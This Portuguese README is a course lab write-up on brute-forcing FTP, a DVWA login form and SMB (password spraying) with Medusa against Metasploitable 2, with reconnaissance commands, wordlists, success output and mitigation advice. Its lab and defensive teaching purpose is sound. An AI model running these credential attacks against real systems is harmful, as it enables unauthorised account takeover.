# 🔐 Segurança Ofensiva com Kali Linux e Medusa

> **Desafio de Projeto — DIO | Cibersegurança**  
> Simulação de ataques de força bruta em ambiente controlado com Kali Linux, Medusa, Metasploitable 2 e DVWA.

---

## 📋 Sumário

- [Sobre o Projeto](#-sobre-o-projeto)
- [Objetivos de Aprendizagem](#-objetivos-de-aprendizagem)
- [Ambiente de Laboratório](#-ambiente-de-laboratório)
- [Conceitos Fundamentais](#-conceitos-fundamentais)
- [Cenário 1: Força Bruta em FTP](#-cenário-1-força-bruta-em-ftp)
- [Cenário 2: Formulário Web com DVWA](#-cenário-2-formulário-web-com-dvwa)
- [Cenário 3: Password Spraying em SMB](#-cenário-3-password-spraying-em-smb)
- [Wordlists Utilizadas](#-wordlists-utilizadas)
- [Medidas de Mitigação](#-medidas-de-mitigação)
- [Reflexões Finais](#-reflexões-finais)
- [Referências](#-referências)

---

## 📌 Sobre o Projeto

Este repositório documenta minha jornada de aprendizagem em **segurança ofensiva**, com foco em ataques de força bruta utilizando o **Kali Linux** e a ferramenta **Medusa**, em um ambiente de laboratório totalmente isolado e controlado.

> ⚠️ **Aviso Ético e Legal:** Todos os testes realizados neste projeto foram executados **exclusivamente em máquinas virtuais próprias**, dentro de uma rede isolada (host-only). Jamais realize testes de intrusão sem autorização explícita por escrito. Ataques não autorizados são crime (Lei nº 12.737/2012 — Lei Carolina Dieckmann / Art. 154-A do Código Penal Brasileiro).

---

## 🎯 Objetivos de Aprendizagem

Ao concluir este projeto, demonstrei capacidade de:

- ✅ Compreender o funcionamento de ataques de força bruta em FTP, HTTP e SMB
- ✅ Configurar e utilizar o Medusa para auditorias em ambiente controlado
- ✅ Montar um laboratório virtual com VirtualBox (Kali + Metasploitable 2)
- ✅ Criar e gerenciar wordlists para testes de senha
- ✅ Propor medidas de mitigação para cada vetor de ataque
- ✅ Documentar processos técnicos de forma clara e reproduzível

---

## 🖥️ Ambiente de Laboratório

### Topologia de Rede

```
┌─────────────────────────────────────────────────────────┐
│                    VirtualBox Host                       │
│                                                         │
│  ┌─────────────────┐    Host-Only     ┌───────────────┐ │
│  │   Kali Linux    │◄────Network─────►│ Metasploitable│ │
│  │  (Atacante)     │   192.168.56.x   │      2        │ │
│  │ 192.168.56.101  │                  │ 192.168.56.102│ │
│  └─────────────────┘                  └───────────────┘ │
│         │                                     │         │
│         └───────────── Isolado ───────────────┘         │
│                   (Sem acesso à internet)                │
└─────────────────────────────────────────────────────────┘
```

### Máquinas Virtuais

| Máquina | SO | Função | IP (Exemplo) |
|---|---|---|---|
| VM 1 | Kali Linux 2024.x | Atacante / Auditor | 192.168.56.101 |
| VM 2 | Metasploitable 2 | Alvo Vulnerável | 192.168.56.102 |

### Configuração do VirtualBox (Rede Host-Only)

```bash
# No VirtualBox: File > Host Network Manager
# Criar adaptador: vboxnet0
# IP Range: 192.168.56.0/24
# DHCP: Habilitado

# Em cada VM: Settings > Network > Adapter 1
# Attached to: Host-only Adapter
# Name: vboxnet0
```

### Ferramentas Utilizadas

| Ferramenta | Versão | Finalidade |
|---|---|---|
| Medusa | 2.2 | Motor de força bruta |
| Metasploitable 2 | — | Alvo com serviços vulneráveis |
| DVWA | 1.10 | Alvo web para testes HTTP |
| Nmap | 7.x | Reconhecimento de serviços |
| enum4linux | 0.9.x | Enumeração SMB |

---

## 🧠 Conceitos Fundamentais

### O que é Força Bruta?

Um ataque de **força bruta** testa sistematicamente combinações de credenciais até encontrar as corretas. Existem variações:

| Tipo | Descrição |
|---|---|
| **Força Bruta Pura** | Testa todas as combinações possíveis de caracteres |
| **Ataque de Dicionário** | Usa listas de palavras pré-definidas (wordlists) |
| **Password Spraying** | Testa uma senha comum contra muitos usuários |
| **Credential Stuffing** | Usa credenciais vazadas de outros serviços |

### O que é o Medusa?

O **Medusa** é uma ferramenta de força bruta paralela, modular e de alto desempenho, pré-instalada no Kali Linux. Suporta mais de 20 protocolos diferentes:

```
FTP, HTTP, HTTPS, SMB, SSH, Telnet, SMTP, POP3, IMAP,
MySQL, MSSQL, PostgreSQL, RDP, VNC, SNMP, entre outros.
```

**Sintaxe geral:**
```bash
medusa -h <HOST> -u <USUÁRIO> -P <WORDLIST> -M <MÓDULO> [opções]
```

**Parâmetros principais:**

| Parâmetro | Descrição |
|---|---|
| `-h` | Host alvo (IP ou hostname) |
| `-H` | Arquivo com lista de hosts |
| `-u` | Usuário único para teste |
| `-U` | Arquivo com lista de usuários |
| `-p` | Senha única para teste |
| `-P` | Arquivo com lista de senhas (wordlist) |
| `-M` | Módulo do protocolo (ftp, http, smb, ssh...) |
| `-t` | Número de threads simultâneas |
| `-f` | Para após a primeira senha encontrada |
| `-v` | Nível de verbosidade (0–6) |
| `-O` | Salva log em arquivo |

---

## 📁 Cenário 1: Força Bruta em FTP

### Contexto

O FTP (File Transfer Protocol) na porta 21 é um dos serviços mais vulneráveis, pois transmite credenciais em texto claro. O Metasploitable 2 roda o **vsftpd 2.3.4** — uma versão com backdoor conhecido.

### Passo 1 — Reconhecimento com Nmap

```bash
# Varredura de serviços no alvo
nmap -sV -p 21 192.168.56.102
```

**Saída esperada:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

### Passo 2 — Verificar módulos do Medusa

```bash
# Listar módulos disponíveis
medusa -d

# Ver ajuda do módulo FTP
medusa -M ftp -q
```

### Passo 3 — Criar wordlist simples

```bash
# Criar arquivo de usuários
cat > usuarios.txt << 'EOF'
admin
root
ftp
user
msfadmin
anonymous
EOF

# Criar arquivo de senhas
cat > senhas.txt << 'EOF'
123456
password
admin
root
msfadmin
toor
ftp
anonymous
letmein
EOF
```

### Passo 4 — Executar o ataque

```bash
# Força bruta no FTP do Metasploitable 2
medusa \
  -h 192.168.56.102 \
  -U usuarios.txt \
  -P senhas.txt \
  -M ftp \
  -t 4 \
  -f \
  -v 4 \
  -O resultado_ftp.txt
```

### Passo 5 — Validar o acesso

```bash
# Após encontrar a credencial, validar manualmente
ftp 192.168.56.102
# login: msfadmin
# senha: msfadmin
```

### Resultado

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

> 💡 O Metasploitable 2 usa `msfadmin:msfadmin` como credenciais padrão — exatamente o tipo de senha que um ataque de dicionário encontra rapidamente.

---

## 🌐 Cenário 2: Formulário Web com DVWA

### Contexto

O **DVWA (Damn Vulnerable Web Application)** é uma aplicação PHP/MySQL propositalmente vulnerável. O formulário de login HTTP é alvo ideal para demonstrar força bruta em serviços web.

### Passo 1 — Identificar a aplicação

```bash
# Verificar porta HTTP
nmap -sV -p 80 192.168.56.102

# Acessar pelo navegador do Kali
firefox http://192.168.56.102/dvwa
```

### Passo 2 — Configurar o DVWA no nível "Low"

No DVWA, navegue até:
```
DVWA Security > Set to Low > Submit
```
Isso desativa proteções como CAPTCHA e rate limiting.

### Passo 3 — Analisar o formulário de login

```bash
# Inspecionar o formulário com curl para entender os parâmetros
curl -s http://192.168.56.102/dvwa/login.php | grep -i "input"
```

Parâmetros identificados:
- Campo usuário: `username`
- Campo senha: `password`
- Token CSRF: `user_token` (se nível Medium+)

### Passo 4 — Executar força bruta HTTP

```bash
# Ataque ao formulário de login do DVWA
medusa \
  -h 192.168.56.102 \
  -u admin \
  -P senhas.txt \
  -M http \
  -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -t 2 \
  -f \
  -v 4
```

### Explicação dos parâmetros HTTP

| Parâmetro `-m` | Valor | Descrição |
|---|---|---|
| `FORM:` | Prefixo | Indica submissão de formulário |
| `/dvwa/login.php` | Caminho | URL do endpoint de login |
| `username=^USER^` | Campo | Placeholder substituído pelo usuário |
| `password=^PASS^` | Campo | Placeholder substituído pela senha |
| `Login failed` | Padrão | Texto que indica falha (inverso = sucesso) |

### Resultado

```
ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
```

---

## 🖧 Cenário 3: Password Spraying em SMB

### Contexto

O SMB (Server Message Block) roda na porta 445 e é usado para compartilhamento de arquivos em redes Windows/Samba. O password spraying testa **uma senha por vez em muitos usuários** — técnica eficaz para evitar bloqueios de conta.

### Passo 1 — Enumerar usuários com enum4linux

```bash
# Enumeração de usuários via SMB
enum4linux -U 192.168.56.102 | grep "user:"
```

**Saída esperada (parcial):**
```
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[msfadmin] rid:[0x3e8]
user:[postgres] rid:[0x3eb]
user:[service] rid:[0x3e9]
user:[user] rid:[0x3ea]
```

### Passo 2 — Salvar usuários enumerados

```bash
# Salvar lista de usuários encontrados
cat > usuarios_smb.txt << 'EOF'
msfadmin
user
postgres
service
admin
EOF
```

### Passo 3 — Password Spraying com Medusa

```bash
# Testar senha única "password" em todos os usuários (spraying)
medusa \
  -h 192.168.56.102 \
  -U usuarios_smb.txt \
  -p password \
  -M smbnt \
  -t 1 \
  -v 4 \
  -O resultado_smb.txt
```

> **Por que `-t 1`?** Password spraying intencional usa 1 thread — simula tentativas lentas para evitar bloqueio de conta por Active Directory ou políticas de lockout.

### Passo 4 — Validar o acesso SMB

```bash
# Validar credencial encontrada
smbclient //192.168.56.102/tmp -U msfadmin
# senha: msfadmin

# Listar compartilhamentos
smbclient -L //192.168.56.102 -U msfadmin
```

### Resultado

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

---

## 📄 Wordlists Utilizadas

As wordlists são a alma de um ataque de dicionário. Abaixo estão as que usei neste projeto (disponíveis na pasta [`/wordlists`](./wordlists/)):

| Arquivo | Conteúdo | Uso |
|---|---|---|
| `usuarios.txt` | Usuários comuns em sistemas Linux | FTP, SSH |
| `senhas.txt` | Senhas mais comuns (Top 25) | Todos os cenários |
| `usuarios_smb.txt` | Usuários enumerados do Metasploitable | SMB Spraying |

**Kali Linux já inclui wordlists prontas:**

```bash
# Localizar wordlists do sistema
ls /usr/share/wordlists/

# A mais famosa: rockyou.txt (14 milhões de senhas reais vazadas)
ls -lh /usr/share/wordlists/rockyou.txt.gz

# Descompactar (se necessário)
gunzip /usr/share/wordlists/rockyou.txt.gz
```

> ⚠️ **Nunca use wordlists massivas (como rockyou.txt) em sistemas reais sem autorização.** Em laboratório, wordlists pequenas e direcionadas são mais eficientes e seguras para aprendizado.

---

## 🛡️ Medidas de Mitigação

Para cada vetor de ataque simulado, existem contramedidas práticas:

### FTP

| Ameaça | Mitigação |
|---|---|
| Credenciais fracas | Implementar política de senhas complexas |
| Brute force | Limitar tentativas de login (fail2ban) |
| Texto claro | Substituir FTP por **SFTP** ou **FTPS** |
| Versão vulnerável | Manter softwares atualizados |

```bash
# Exemplo: Configurar fail2ban para FTP
# /etc/fail2ban/jail.local
[vsftpd]
enabled  = true
port     = ftp,ftp-data,ftps,ftps-data
filter   = vsftpd
maxretry = 5
bantime  = 3600
```

### HTTP / Formulários Web

| Ameaça | Mitigação |
|---|---|
| Brute force | **Rate limiting** (ex: 5 tentativas/minuto por IP) |
| Automação | **CAPTCHA** após falhas repetidas |
| Sessão previsível | Usar **tokens CSRF** em formulários |
| Credenciais fracas | Exigir **MFA (autenticação multifator)** |
| Reconhecimento | Ocultar mensagens de erro específicas |

```php
// Exemplo PHP: Implementar rate limiting básico
session_start();
if (!isset($_SESSION['tentativas'])) {
    $_SESSION['tentativas'] = 0;
}
if ($_SESSION['tentativas'] >= 5) {
    die("Muitas tentativas. Tente em 15 minutos.");
}
```

### SMB / Rede

| Ameaça | Mitigação |
|---|---|
| Password Spraying | **Account lockout policy** (ex: bloqueio após 5 falhas) |
| Enumeração de usuários | Restringir acesso anônimo ao SMB |
| Exposição do serviço | **Firewall** — bloquear porta 445 externamente |
| Versão antiga | Desabilitar **SMBv1** (vulnerável ao EternalBlue) |
| Acesso não autorizado | Implementar **NTLMv2** ou **Kerberos** |

```bash
# Verificar versão SMB habilitada (Windows)
Get-SmbServerConfiguration | Select EnableSMB1Protocol

# Desabilitar SMBv1 (PowerShell como Admin)
Set-SmbServerConfiguration -EnableSMB1Protocol $false
```

### Princípios Gerais de Defesa

```
🔒 Princípio do Menor Privilégio    → Cada conta só acessa o que precisa
🔑 Autenticação Multifator (MFA)    → Segunda camada de verificação
📊 Monitoramento e Logs             → Detectar padrões anômalos
🔄 Atualizações regulares           → Corrigir vulnerabilidades conhecidas
🧪 Testes de penetração periódicos  → Identificar brechas antes dos atacantes
```

---

## 💭 Reflexões Finais

Este projeto me permitiu compreender na prática como ataques de força bruta funcionam — e, mais importante, **por que senhas fracas são o maior risco em qualquer infraestrutura**.

### O que aprendi

**1. A velocidade do Medusa é assustadora**  
Com apenas 4 threads e uma wordlist de ~100 senhas, o ataque ao FTP foi concluído em segundos. Senhas fracas como `admin`, `123456` ou o próprio nome do serviço são encontradas imediatamente.

**2. Enumeração é metade da batalha**  
Antes de qualquer ataque, o reconhecimento com Nmap e enum4linux revelou quais serviços estavam ativos, suas versões e até os usuários do sistema — informações valiosas para atacante e defensor.

**3. Defesa em profundidade**  
Nenhuma medida isolada é suficiente. A combinação de senhas fortes + MFA + rate limiting + monitoramento cria camadas que tornam o ataque inviável economicamente para o atacante.

**4. Documentação é habilidade técnica**  
Saber executar um ataque não é suficiente. Documentar o processo — com contexto, comandos, saídas esperadas e recomendações — é a diferença entre um profissional de segurança e alguém que apenas copia comandos.

### Diferença entre Atacante e Defensor

```
Atacante precisa ter sucesso UMA vez.
Defensor precisa ter sucesso TODAS as vezes.
```

Por isso, a mentalidade ofensiva (pentest) é tão valiosa para os defensores: **pensar como o atacante** é o caminho mais eficiente para antecipar e mitigar riscos reais.

---

## 📚 Referências

- [Documentação oficial do Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)
- [Metasploitable 2 — Rapid7](https://github.com/rapid7/metasploitable3)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [OWASP Testing Guide — Brute Force](https://owasp.org/www-project-web-security-testing-guide/)
- [Kali Linux Official Docs](https://www.kali.org/docs/)
- [fail2ban Documentation](https://www.fail2ban.org/wiki/index.php/Main_Page)
- [Lei nº 12.737/2012 (Lei Carolina Dieckmann)](https://www.planalto.gov.br/ccivil_03/_ato2011-2014/2012/lei/l12737.htm)
- [CIS Benchmarks — Security Configuration](https://www.cisecurity.org/cis-benchmarks/)

---

## 🗂️ Estrutura do Repositório

```
📁 dio-lab-open-source/
├── 📄 README.md                      ← Este arquivo
├── 📄 DOCUMENTACAO_WSL_PUTTY.md      ← Guia de configuração WSL + SSH
├── 📁 wordlists/
│   ├── 📄 usuarios.txt               ← Lista de usuários para testes
│   └── 📄 senhas.txt                 ← Wordlist de senhas comuns
└── 📁 scripts/
    └── 📄 lab_setup_check.sh         ← Script de verificação do ambiente
```

---

<div align="center">

**Desenvolvido como parte do programa de aprendizagem em Cibersegurança da [DIO](https://www.dio.me)**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com)
[![GitHub](https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white)](https://github.com)

*"Security is not a product, but a process." — Bruce Schneier*

</div>
